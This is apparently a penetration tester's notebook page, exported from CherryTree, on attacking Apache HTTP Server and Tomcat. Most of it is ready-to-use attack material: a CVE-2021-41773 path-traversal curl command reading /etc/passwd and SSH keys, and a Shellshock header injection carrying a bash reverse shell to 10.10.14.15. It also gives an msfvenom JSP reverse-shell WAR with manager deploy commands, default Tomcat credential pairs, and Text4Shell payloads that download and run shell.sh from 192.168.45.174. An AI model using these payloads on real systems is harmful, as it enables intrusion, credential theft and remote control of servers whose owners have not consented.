<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>04- apache/ tomcat</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>04- apache/ tomcat</h1><br/><p><h2>Apache Overview</h2><ul><li>apache is probably the most popular web server with millions of deployments0</li></ul></p><p><h2>Apache CVEs</h2><ul><li>CVE-2021-41773<ul><li><h3>Apache HTTP Server 2.4.49</h3><ul><li></li></ul></li></ul></li></ul><div class="codebox"><pre>curl <span style="color:#ff9d00;font-weight:700">--</span>silent <span style="color:#ff9d00;font-weight:700">--</span><span style="color:#00117f;font-weight:400">path-as-is</span> <span style="color:#ff9d00;font-weight:700">--</span>insecure <span style="color:#ff9d00;font-weight:700">-</span>k <span style="color:#3ad900;font-weight:400">&quot;web01.relia.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">## rce needs mod_cgi enableed </span><br /><br /><span style="color:#0088ff;font-weight:400">## path travesal exploit</span><br /><br /><span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>.ssh<span style="color:#ff9d00;font-weight:700">/</span>id_rsa<br /><span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>yharrizi<span style="color:#ff9d00;font-weight:700">/</span>.ssh<span style="color:#ff9d00;font-weight:700">/</span>known_hosts<br /><span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#0088ff;font-weight:400">$user</span><span style="color:#ff9d00;font-weight:700">/</span>.bash_history<br /> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>ssh<span style="color:#ff9d00;font-weight:700">/</span>known_hosts</pre></div><ul><li>echo; id; uname&#39;</li><li>&gt;uid=1(daemon) gid=1(daemon) groups=1(daemon)</li></ul></li><li>Shellshock<ul><li>whenever we have cf=gi-bin <ul><li>/cgi-bin/admin.cgi </li></ul></li><li>Apache  PHP 5.x  - cgi-bin Remote Code Execution Exploit</li><li>Detect<ul><li>nmap $target -p 80 --script=http-shellshock \</li></ul></li></ul></p><p>--script-args uri=$path1--script-args uri=$path2<ul><li>/cgi-bin/script.sh</li><li>inject into User agent and other headers  shellshock command<ul><li>() { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1</li><li>curl -H &quot;User-Agent: () { :; }; /bin/bash -c &#39;echo aaaa; which nc; echo zzzz;&#39;&quot; http://$url/cgi-bin/admin.cgi</li></ul></li></ul></p><p>| sed -n &#39;/aaaa/{:a;n;/zzzz/b;p;ba}&#39;</p><p><ul><li>GHostcat (when port 8009 is exposed and :<ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li><li>LFI<ul><li>t allows any attacker to read files such as configuration files , test files or any other tomcat directory files . In addition, if a victim website permits any user to upload files, an attacker can upload the file containing malicious JSP code to the server and then include the uploaded file by exploiting the Ghostcat vulnerability,</li></ul></li></ul></li></ul></p><p></p><p></p><p><h2>apache misconfigs methodology</h2><ul><li>.htaccess file<ul><li>config file per directory</li><li>.htaccess files should be used in a case where the content providers need to make configuration changes to the server on a per-directory basis, but do not have root access on the server system</li><li>can be used for example for  a security measure per directory (example treat files as text)</li><li>can be used by the attacker also to remove restrictions</li></ul></li></ul></p><p></p><p></p><p><h2>tomcat: RCE after getting admin creds (CVE-2017-12617)</h2><ul><li><h3> deploy a war file with msfvenom</h3><ul><li><h3>sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=443 -f war -o revshell.war</h3></li><li><h3>if linux system create elf file and rename it to *.war</h3></li></ul></li><li><h3> go to the http://$target/revshell/file.jsp // we need to unzip the war file to get the name</h3><ul><li><h3>or https://github.com/BustedSec/webshell/blob/master/webshell.war</h3></li></ul></li><li><h3>war webshell</h3><ul><li><h3>https://github.com/cyberheartmi9/CVE-2017-12617</h3></li></ul></li><li><h3>metasploit :</h3><ul><li><h3>exploit/multi/http/_jsp_upload_bypass</h3></li></ul></li></ul><h3></h3></p><p><h3> * exploit/multi/http/_mgr_deploy</h3></p><p> </p><p> </p><p><h2> Resources</h2><ul><li> <a href="https://book.hack.xyz/network-services-pentesting/pentesting-web/tomcat">https://book.hack.xyz/network-services-pentesting/pentesting-web/tomcat</a></li></ul></p><p></p><p></p><p></p><p><h2>CGi apache</h2><ul><li>/usr/share/seclists/Discovery/Web_Content/cgis.txt</li></ul></p><p></p><p><em><h2>Apache tomcat wordlist</h2></em><ul><li>metasploit<ul><li>msf&gt; use auxiliary/scanner/http/tomcat_mgr_login</li></ul></li><li>manual<ul><li></li></ul></li></ul><div class="codebox"><pre>admin:admin<br />tomcat:tomcat<br />admin:<span style="color:#ff9d00;font-weight:700">&lt;</span>NOTHING<span style="color:#ff9d00;font-weight:700">&gt;</span><br />admin:s3cr3t<br />tomcat:s3cr3t<br />admin:tomcat<br />tomcat:s3cret<br />admin:s3cret</pre></div></p><p></p><p></p><p></p><p><em><h2>Apache tomcat access manager console</h2></em><ul><li><a href="http://10.11.1.222:8080/manager/html">http://10.11.1.222:8080/manager/html</a></li><li>Deploy without gui access<ul><li># tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed</li></ul></li></ul></p><p></p><p># deploy under &quot;path&quot; context path</p><p>curl --upload-file monshell.war -u &#39;admin:adminadmin&#39; &quot;$url/manager/text/deploy?path=/monshell&quot;</p><p></p><p># undeploy</p><p>curl &quot;http://admin:adminadmin@10.11.1.222:8080/manager/text/undeploy?path=/monshell&quot;</p><p></p><p></p><p></p><p><span style="color:#ff7800;text-decoration:underline;">apache Common Text Text4Shell</span><ul><li><span style="color:#ff7800;">• </span>• <a href="https://www.tarlogic.com/blog/cve-2022-42889-text4shell-vulnerability/">https://www.tarlogic.com/blog/cve-2022-42889-text4shell-vulnerability/</a></li><li></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## encode here https://meyerweb.com/eric/tools/dencoder/)</span><br /><span style="color:#7f0044;font-weight:400">${</span><span style="color:#ff9d00;font-weight:400">script:javascript:java.lang.Runtime.getRuntime().exec(&#39;wget 192.168.45.174/shell.sh -O /tmp/shell&#39;)</span><span style="color:#7f0044;font-weight:400">}</span><br /><span style="color:#7f0044;font-weight:400">${</span><span style="color:#ff9d00;font-weight:400">script:javascript:java.lang.Runtime.getRuntime().exec(&#39;bash /tmp/shell&#39;)</span><span style="color:#7f0044;font-weight:400">}</span><br /></pre></div><span style="color:#ff7800;"></span></p><p><span style="color:#ff7800;"></span></p></div>
</body>
</html>
